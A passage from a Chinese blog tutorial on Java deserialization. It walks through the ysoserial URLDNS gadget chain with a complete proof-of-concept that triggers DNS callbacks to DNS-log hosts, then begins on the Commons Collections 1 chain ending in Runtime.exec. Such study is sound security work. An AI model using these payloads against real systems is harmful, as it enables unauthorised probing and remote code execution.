**作者：p1g3@D0g3**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：PI:EMAIL**
本篇将以URLDNS以及Commons Collections系列漏洞作为Java反序列化基础篇的练习，仅以巩固对反序列化这类漏洞的理解。
目前已经有很多java反序列化的学习文章供我们学习，所以我算是站在巨人的肩膀上完成了这篇文章，如果有什么错误的地方，欢迎指正，感谢。
下文将以yso代替ysoserial，以cc代替Commons
Collections进行分析。ysoserial的payload可以通过访问[payloads](https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads)获得。
以下描述的链中涉及到的class均实现了Serializable，所以均可被反序列化，这点将不再提及。
# URLDNS
URLDNS是反序列化时经常会用到的链，通常用于快速检测是否存在反序列化漏洞，原因如下：
  * 只依赖原生类
  * 不限制jdk版本
测试环境：jdk 8u131
## 利用链
     *     HashMap.readObject()
     *       HashMap.putVal()
     *         HashMap.hash()
     *           URL.hashCode()
## 利用链分析
urldns是yso中较为简单的一个gadget，所以这里可以直接通过正向分析的方式进行分析。
HashMap#readObject：
    private void readObject(java.io.ObjectInputStream s)
            throws IOException, ClassNotFoundException {
            // Read in the threshold (ignored), loadfactor, and any hidden stuff
            s.defaultReadObject();
            reinitialize();
            if (loadFactor  0) { // (if zero, use defaults)
                // Size the table using given load factor only if within
                // range of 0.25...4.0
                float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
                float fc = (float)mappings / lf + 1.0f;
                int cap = ((fc = MAXIMUM_CAPACITY) ?
                           MAXIMUM_CAPACITY :
                           tableSizeFor((int)fc));
                float ft = (float)cap * lf;
                threshold = ((cap [] tab = (Node[])new Node[cap];
                table = tab;
                // Read the keys and values, and put the mappings in the HashMap
                for (int i = 0; i >> 16);
        }
这里调用了key.hashCode方法，让我们看看URL的hashCode方法：
URL#hashCode：
        public synchronized int hashCode() {
            if (hashCode != -1)
                return hashCode;
            hashCode = handler.hashCode(this);
            return hashCode;
        }
在URL类的hashCode方法中，又调用了URLStreamHandler#hashCode，并将自身传递进去：
URLStreamHandler#hashCode
    protected int hashCode(URL u) {
            int h = 0;
            // Generate the protocol part.
            String protocol = u.getProtocol();
            if (protocol != null)
                h += protocol.hashCode();
            // Generate the host part.
            InetAddress addr = getHostAddress(u);
重点关注这里的getHostAddress，正是这步触发了dns请求：
回到第一步：HashMap#readObject
key是使用readObject取出来的，也就是说在writeObject一定会写入key：
        private void writeObject(java.io.ObjectOutputStream s)
            throws IOException {
            int buckets = capacity();
            // Write out the threshold, loadfactor, and any hidden stuff
            s.defaultWriteObject();
            s.writeInt(buckets);
            s.writeInt(size);
            internalWriteEntries(s);
        }
跟入internalWriteEntries：
        void internalWriteEntries(java.io.ObjectOutputStream s) throws IOException {
            Node[] tab;
            if (size > 0 && (tab = table) != null) {
                for (int i = 0; i  e = tab[i]; e != null; e = e.next) {
                        s.writeObject(e.key);
                        s.writeObject(e.value);
                    }
                }
            }
        }
不难发现，这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。
此时我们如果想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询：
HashMap#put：
        public V put(K key, V value) {
            return putVal(hash(key), key, value, false, true);
        }
    import java.util.HashMap;
    import java.net.URL;
    public class Test {
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://urldns.4ac35f51205046ab.dnslog.cc/");
            map.put(url,123); //此时会产生dns查询
        }
    }
我们只想判断payload在对方机器上是否成功触发，那该怎么避免掉这一次dns查询，回到URL#hashCode：
        public synchronized int hashCode() {
            if (hashCode != -1)
                return hashCode;
            hashCode = handler.hashCode(this);
            return hashCode;
        }
这里会先判断hashCode是否为-1，如果不为-1则直接返回hashCode，也就是说我们只要在put前修改URL的hashCode为其他任意值，就可以在put时不触发dns查询。
这里的hashCode是private修饰的，所以我们需要通过反射来修改其值。
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.net.URL;
    public class Test {
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://urldns.4ac35f51205046ab.dnslog.cc/");
            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true); //修改访问权限
            f.set(url,123); //设置hashCode值为123，这里可以是任何不为-1的数字
            System.out.println(url.hashCode()); // 获取hashCode的值，验证是否修改成功
            map.put(url,123); //调用map.put 此时将不会再触发dns查询
        }
    }
此时输出url的hashCode为123，证明修改成功。当put完毕之后再将url的hashCode修改为-1，确保在反序列化调用hashCode方法时能够正常进行，下面是完整的POC：
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.net.URL;
    public class Test {
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://urldns1.eakcmc.ceye.io/");
            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true); // 修改访问权限
            f.set(url,123); // 设置hashCode值为123，这里可以是任何不为-1的数字
            System.out.println(url.hashCode()); // 获取hashCode的值，验证是否修改成功
            map.put(url,123); // 调用map.put 此时将不会再触发dns查询
            f.set(url,-1); // 将url的hashCode重新设置为-1。确保在反序列化时能够成功触发
            try{
                FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
                ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
                outputStream.writeObject(map);
                outputStream.close();
                fileOutputStream.close();
                FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
                ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
                inputStream.readObject();
                inputStream.close();
                fileInputStream.close();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
回过头来看看yso的payload：
            public Object getObject(final String url) throws Exception {
                    //Avoid DNS resolution during payload creation
                    //Since the field java.net.URL.handler is transient, it will not be part of the serialized payload.
                    URLStreamHandler handler = new SilentURLStreamHandler();
                    HashMap ht = new HashMap(); // HashMap that will contain the URL
                    URL u = new URL(null, url, handler); // URL to use as the Key
                    ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
                    Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
                    return ht;
            }
yso在创建URL对象时使用了三个参数的构造方法。这里比较有意思的是，yso用了子类继承父类的方式规避了dns查询的风险，其创建了一个内部类：
    static class SilentURLStreamHandler extends URLStreamHandler {
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }
            protected synchronized InetAddress getHostAddress(URL u) {
                return null;
            }
        }
定义了一个URLConnection和getHostAddress方法，当调用put方法走到getHostAddress方法后，会调用SilentURLStreamHandler的getHostAddress而非URLStreamHandler的getHostAddress，这里直接return
null了，所以自然也就不会产生dns查询。
那么为什么在反序列化时又可以产生dns查询了呢？是因为这里的handler属性被设置为transient，前面说了被transient修饰的变量无法被序列化，所以最终反序列化读取出来的transient依旧是其初始值，也就是URLStreamHandler。
这也就解释了为什么反序列化后获取的handler并不是前面设置的SilentURLStreamHandler了。
两种方法都可以规避在put时造成的dns查询，前者比较简单且思路清晰，后者比较麻烦但同时也比较炫一些。当然，这里也可以直接不用HashMap#put方法来设置table，可以通过反射的方式来设置table，但是相对而言十分麻烦，所以并没有使用。
最终。我认为yso中写的利用链并不详细，我认为的利用链应该是这样的：
    HashMap#readObject
        HashMap#hash
            URL#hashCode
            URLStreamHandler#hashCode
            URLStreamHandler#getHostAddress
在JDK7中也是一样的，HashMap#readObject中最后调的方法改了一下：
但是实际上还是会触发hash方法：
最终还是会调用到URL#hashCode：
# Commons Collections
Apache
Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。
Commons Collections包为Java标准的Collections
API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。
由于大量的生产环境中都会导入这个包，所以此包中的众多反序列化链已经成为经典链条，本篇将对cc1-7的链进行梳理和总结，以加深对java反序列化的理解。
## 环境搭建
在这里统一使用maven来导包，比较方便也比较快捷。
先按照网上的安装和配置好maven（创建本地仓库和选择远程仓库等），接着使用idea->create new project->maven。
之后要导包的话修改pom.xml即可，比如我这里要导一个cc3.1，只需要添加以下内容：
            commons-collections
            commons-collections
            3.1
之后右侧会出现一个类似的更新按钮：
点击后即可实现自动导包，十分方便和快捷。导包完成之后左侧就可以看到成功导入的包了：
如果要修改jdk的话，需要改两个点，一个是编译用的jdk，一个是导包用的jdk。
第一个点可以在这里修改，首先新建一个maven的编译环境：
之后改jdk可以在runner这里改：
第二个导包的jdk可以从File->Project Structure->Modules->Dependencies这里修改：
## CommonsCollections 1
测试环境：
  * JDK 1.7
  * Commons Collections 3.1
### 利用链
    ObjectInputStream.readObject()
                AnnotationInvocationHandler.readObject()
                    Map(Proxy).entrySet()
                        AnnotationInvocationHandler.invoke()
                            LazyMap.get()
                                ChainedTransformer.transform()
                                    ConstantTransformer.transform()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Class.getMethod()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.getRuntime()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.exec()
### 动态代理
在cc1的前半部分链中用到了这里的知识，记录一下。
举一个简单的例子，供货商发货给超市，我们去超市买东西。
此时超市就相当于一个代理，我们可以直接去供货商买东西，但没多少人会这么做。
在Java中的代理模式也是一样，我们需要定义一个接口，这个接口不可以直接被实例化，需要通过类去实现这个接口，才可以实现对这个接口中方法的调用。
而动态代理实现了不需要中间商（类），直接“创建”某个接口的实例，对其方法进行调用。
当我们调用某个动态代理对象的方法时，都会触发代理类的invoke方法，并传递对应的内容。
Demo：
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Method;
    import java.lang.reflect.Proxy;
    public class Test {
        public static void main(String[] args){
                InvocationHandler handler = new InvocationHandler() {
                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                        System.out.println(method);
                        if (method.getName().equals("morning")) {
                            System.out.println("Good morning, " + args[0]);
                        }
                        return null;
                    }
                };
                Hello hello = (Hello)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Hello.class},handler);
                hello.morning("liming");
        }
    }
Hello.java：
    public interface Hello {
        void morning(String name);
    }
这里首先定义了一个handler，通过其实现对某个类接口的调用。
接着定义了一个代理对象Hello，需要传递三个参数分别为ClassLoader、要代理的接口数组以及调用接口时触发的对应方法。
此时我调用hello.morning,就会触发handler的invoke方法，并传递三个参数进去，分别为proxy即代理对象，method即调用的方法的Method对象，args即传递的参数。
所有的handler都需要实现InvocationHandler这个接口，并实现其invoke方法来实现对接口的调用。
### 利用链分析
先对后半段链进行分析。在commons